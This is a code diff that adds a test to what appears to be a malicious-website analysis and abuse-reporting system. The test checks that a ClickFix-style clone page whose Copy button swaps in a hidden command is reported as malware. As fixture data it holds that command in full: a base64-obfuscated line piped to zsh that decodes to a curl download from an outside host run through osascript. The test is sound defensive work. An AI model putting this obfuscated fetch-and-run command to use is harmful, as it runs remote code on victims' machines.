@@ -574,3 +574,43 @@ describe("the raw answers of a chain across the pages of a visit", () => {
 		expect(calls.filter((call) => call.kind === "classification").map((call) => call.url)).toEqual([CONSENT, GET_STARTED]);
 	});
 });
+
+describe("a page whose Copy button hands out another command than it shows", () => {
+	test("is reported as malware on the copied command, whose payload the investigation fetches (trylevo.app)", async () => {
+		// Production case 384401854580134038: a ClickFix clone of the Levo app's site. Its install
+		// dialog shows `brew install --cask levo`; its Copy button fetched ./install-command.txt and
+		// copied this instead. Read from the page alone, it was found benign.
+		const LEVO = "https://trylevo.app/";
+		const copied = ": \"brew install --cask levo\"; printf 'Y3VybCAtc2ZMIC0tcmV0cnkgMyAtLXJldHJ5LWFsbC1lcnJvcnMgaHR0cHM6Ly9ob3N0c3luYy5wcm8vaGdwMDNtL0xOY2Y4S3BtNnFXciB8IG9zYXNjcmlwdCAtbCBKYXZhU2NyaXB0' | base64 -d | zsh";
+		const decoded = "curl -sfL --retry 3 --retry-all-errors https://hostsync.pro/hgp03m/LNcf8Kpm6qWr | osascript -l JavaScript";
+		PAGES[LEVO] = `<html lang="en"><head><title>Levo</title></head><body><h1>Levo</h1><p>The menu bar app for your day.</p>
+<div role="dialog"><h2>Install Levo</h2><p>Run this in Terminal:</p><code>brew install --cask levo</code> <button>Copy</button></div></body></html>`;
+		const answers: ClassifierAnswers = { [LEVO]: { finding: "malware", phishingBasis: "none", evidenceQuote: decoded, collectionFieldRefs: [], hiddenFrameRef: "", mobileHandoff: false } };
+		const visit = visited(liveCapture(LEVO), { clipboardWrites: [{ text: copied, documentUrl: LEVO, via: "writeText" }] });
+		const id = await websiteSubmission(384401854580134038n, LEVO);
+
+		await analyzeWebsite({ submissionId: id, url: LEVO }, dependencies({ answers, captures: [], capture: () => visit.archive }));
+
+		const submission = await SubmissionsEntity.get(id);
+		expect(submission?.status).toBe("reported");
+		expect(submission?.info).toBe(`Malware distribution confirmed at ${LEVO}; its evidence is being collected before the report is sent.`);
+		const website = websiteData(submission);
+		expect(website?.routes![0]!.visit?.clipboardWrites).toEqual([{ text: copied, documentUrl: LEVO, via: "writeText", at: expect.any(String) }]);
+		expect(website?.routes![0]!.siteAssessments?.[0]).toMatchObject({ finding: "malware", evidenceQuote: decoded, clipboardWrite: { documentUrl: LEVO, sha256: sha256Hex(copied) } });
+
+		// The report says what the page shows, what it copies, and where that fetches its code from.
+		const report = await AbuseRepository.getReportForSubmission(id);
+		expect(report!.description).toContain("The page's copy control puts this command on the visitor's clipboard instead, which the page does not show (defanged):");
+		expect(report!.description).toContain("It shows \"brew install --cask levo\" so the visitor believes a legitimate install is running.");
+		expect(report!.description).toContain("It downloads and runs code from: https://hostsync.pro/hgp03m/LNcf8Kpm6qWr.");
+		// The investigation fetches the copied command's payload, as it does a shown command's.
+		const job = (await getDb()).select().from(abuseJobs).where(eq(abuseJobs.reportId, report!.id)).get()!;
+		expect(readInvestigationJobPayload(job.payload).pasteCommands).toEqual([{ shown: copied, payloadUrls: ["https://hostsync.pro/hgp03m/LNcf8Kpm6qWr"], interpreters: ["curl", "osascript"] }]);
+
+		// The visit's evidence keeps what the page copied, in its chronology too.
+		const files = await ArtifactsEntity.listForSubmission(id);
+		const read = async (name: string) => Buffer.from((await ArtifactsEntity.get(files.find((file) => file.name === name)!.id))!.blob).toString("utf8");
+		expect(JSON.parse(await read("visit-record.json")).clipboardWrites).toEqual([expect.objectContaining({ text: copied, documentUrl: LEVO })]);
+		expect(await read("visit-protocol.txt")).toContain(`Page ${LEVO} put on the clipboard (writeText): ${JSON.stringify(copied)}`);
+	});
+});
